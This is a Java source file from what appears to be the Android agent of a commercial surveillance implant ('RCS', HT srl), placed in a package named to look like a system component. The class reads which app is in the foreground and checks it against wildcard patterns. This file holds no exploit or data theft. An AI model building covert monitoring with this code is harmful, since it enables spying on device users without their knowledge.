/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : RunningProcesses.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.content.ComponentName;
import android.content.Context;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.StringUtils;

public class RunningProcesses {
	private static final String TAG = "RunningProcess"; //$NON-NLS-1$

	private String foreground = "";
	private final ActivityManager activityManager;
	private long time;

	public RunningProcesses() {
		activityManager = (ActivityManager) Status.getAppContext().getSystemService(Context.ACTIVITY_SERVICE);
	}

	public synchronized String getForeground() {
		if (Cfg.DEBUG) {
			Check.requires(activityManager != null, "Null activityManager"); //$NON-NLS-1$
		}

		// get the info from the currently running task
		List<ActivityManager.RunningTaskInfo> taskInfo = activityManager.getRunningTasks(1);
		if (Cfg.DEBUG) {
			Check.log(TAG + " (update) topActivity CURRENT Activity ::" + taskInfo.get(0).topActivity.getClassName());
		}

		ComponentName componentInfo = taskInfo.get(0).topActivity;
		foreground = componentInfo.getPackageName();

		time = System.currentTimeMillis();

		return foreground;
	}

	public synchronized boolean isPresent(String process) {

		if (foreground == null || foreground.length() == 0) {
			return false;
		}

		if (process.length() == 0) {
			return false;
		}

		if (StringUtils.matchStar(process, foreground) == true) {
			return true;
		}

		return false;
	}

}
